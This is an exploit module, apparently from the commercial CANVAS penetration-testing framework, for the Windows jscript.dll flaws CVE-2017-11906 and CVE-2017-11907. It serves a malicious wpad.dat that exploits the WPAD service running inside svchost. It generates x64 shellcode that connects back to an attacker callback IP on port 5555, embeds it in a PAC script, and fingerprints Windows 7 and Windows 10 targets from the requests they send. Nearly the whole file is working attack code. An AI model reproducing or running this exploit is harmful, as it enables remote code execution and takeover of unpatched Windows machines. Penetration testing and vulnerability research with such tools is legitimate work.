#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib
import re
import base64
import urllib

from shellcode import shellcodeGenerator

from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows import payloads64

from exploitutils import *
from tcpexploit import *
import canvasengine


NAME                              = 'wpad_jscript'
DESCRIPTION                       = 'WPAD/PAC Exploit via JScript Heap Overflow'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Microsoft'
DOCUMENTATION['REFERENCES']       = ['https://bugs.chromium.org/p/project-zero/issues/detail?id=1382',
                                     'https://bugs.chromium.org/p/project-zero/issues/detail?id=1383']

DOCUMENTATION['CVE NAME']         = 'CVE-2017-11906 / CVE-2017-11907'
DOCUMENTATION['CVE URL']          = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11906, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11907'
DOCUMENTATION['NOTES']            = """

This module exploits two vulnerabilities present in the jscript.dll library.
The first one is an out-of-bounds read and the second one a heap overflow.
Both vulnerabilities are used to achieve remote code execution.
Currently, the module exploits this vulnerabilities inside the 'WinHTTP Web
Proxy Auto-Discovery Service' (svchost.exe). This is achieved by serving a
malicious wpad.dat.
The configuration that forces the target host to request this file is set up
via DHCP (DHCP Option 252). Currently, this is assumed that has been already done.
The node will connect back as nt authority\local service.

There are some caveats that should be taken into account while using this module:
* Exploiting the issues via an HTML page inside IE11 is no longer available.
* The module can only target one machine, i.e. after exploiting one machine if
  we want to target another one, the module should be reloaded.
* While targeting Windows 10, there is a possibility where the payload get executed
  twice. Consequently, two nodes will connect back.


Tested on:
- Windows 7 Professional SP1 x64
- Windows 10 Pro 1607 x64

"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""


wpad_served = False

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.jsrealfilename  = {'WIN10_1607_x64':'exploitW10.js', 'WIN7_SP1_x64':'exploitW7.js'}
        self.plugin_info     = None # we want clientd to give us a plugin dict


    def createShellcode(self, target):
        if target == 'WIN10_1607_x64':
            heading = """
            """
            ending = """
                add $0x318, %rsp
                add $0x138, %rsp
                mov $0x80000000, %eax
                xor %r15, %r15
                xor %rsi, %rsi
                ret
            """

            p = payloads64.payloads()
            asm = p.InjectToSelf(self.callback.ip, 5555, heading, ending)
            self.shellcode = p.assemble(asm)
        elif target == 'WIN7_SP1_x64':
            heading = """
            """
            ending = """
                add $0x318, %rsp
                add $0xE0, %rsp
                mov $0x80000000, %eax
                xor %r15, %r15
                xor %rsi, %rsi
                ret
            """

            p = payloads64.payloads()
            asm = p.InjectToSelf(self.callback.ip, 5555, heading, ending)
            self.shellcode = p.assemble(asm)
        else:
            logging.info('Unknown target')

    def makeWPAD(self, target):
        # Currently only 64-bits supported
        self.createShellcode(target)

        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.jsrealfilename[target]), 'rb') as f:
            jsdata = f.read()
        jsdata = jsdata.replace('PAYLOAD', urluencode(self.shellcode))


        if target == 'WIN10_1607_x64':
            # First call by svchost on Windows 10 Pro 1607 x64:
            #   url: http://www.msftconnecttest.com/
            #   host: www.msftconnecttest.com
            wpad = '''function FindProxyForURL(url, host) {
                        Math.acos("url:"+url);
                        Math.acos("host:"+host);
                        // wait for the Microsoft Network Connectivity Status Indicator request
                        if (url == "http://www.msftconnecttest.com/" && host == "www.msftconnecttest.com") {
                            %s
                        }
                	    return "DIRECT";
                    }'''%jsdata
        elif target == 'WIN7_SP1_x64':
            # First call by svchost on Windows 7 Professional SP1 x64:
            #   url: http://www.msftncsi.com
            #   host: www.msftncsi.com
            wpad = '''function FindProxyForURL(url, host) {
                        Math.acos("url:"+url);
                        Math.acos("host:"+host);
                        // wait for the Microsoft Network Connectivity Status Indicator request
                        if (url == "http://www.msftncsi.com" && host == "www.msftncsi.com") {
                            %s
                        }
                	    return "DIRECT";
                    }'''%jsdata
        else:
            logging.info('Unknown target.')

        return wpad

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        global wpad_served
        if wpad_served:
            logging.debug("Another request received, ignoring")
            return h, b

        if self.filename in clientheader.URL:
            logging.info('Requesting HTML file, not implemented')
        elif "wpad.dat" in clientheader.URL:

            if 'User-Agent' in clientheader.getAllHeaders().keys():
            # Request sent by svchost on Windows 10 Pro 1607 x64:
            #   GET /wpad.dat HTTP/1.1
            #   Connection: Keep-Alive
            #   Accept: */*
            #   User-Agent: WinHttp-Autoproxy-Service/5.1
            #   Host: wpad.server.com:8080

                user_agent = clientheader.getStrValue(['User-Agent'])
                logging.info('Received header: User-Agent: ' + user_agent)
                if 'WinHttp-Autoproxy-Service/5.1' in user_agent:
                    logging.info('Assumed target: Windows 10 Pro 1607 (x64) - SVCHOST')
                    sploitstring = self.makeWPAD('WIN10_1607_x64')
                    b.setBody(sploitstring)
                    h.addHeader('Content-Type', 'text/html')
                    wpad_served = True
                else:
                    logging.info('User-Agent unkwnown')
                    logging.info('Probaly, targeting a not supported Windows version')

            elif set(clientheader.getAllHeaders().keys()) == set(['Connection', 'Host', 'Accept']):
            # Request sent by svchost on Windows 7 Professional SP1 x64:
            #   GET /wpad.dat HTTP/1.1
            #   Connection: Keep-Alive
            #   Accept: */*
            #   Host: wpad.server.com:8080
                logging.info('Assumed target: Windows 7 Professional SP1 (x64) - SVCHOST')
                sploitstring = self.makeWPAD('WIN7_SP1_x64')
                b.setBody(sploitstring)
                h.addHeader('Content-Type', 'text/html')
                wpad_served = True

            else:
                logging.info('Probaly, targeting a not supported Windows version')

        else:
            logging.info('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h, b

    def run(self):
        # Build the wpad.dat file that triggers the vulnerability
        filename = 'wpad.dat'
        filedata = self.makeWPAD('WIN10_1607_x64')
        logging.info('Opening %s for output' % filename)
        fd=file(filename, 'wb+')
        fd.write(filedata)
        fd.close()
        logging.info('Wrote exploit wpad.dat to %s' % filename)

        return 1


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
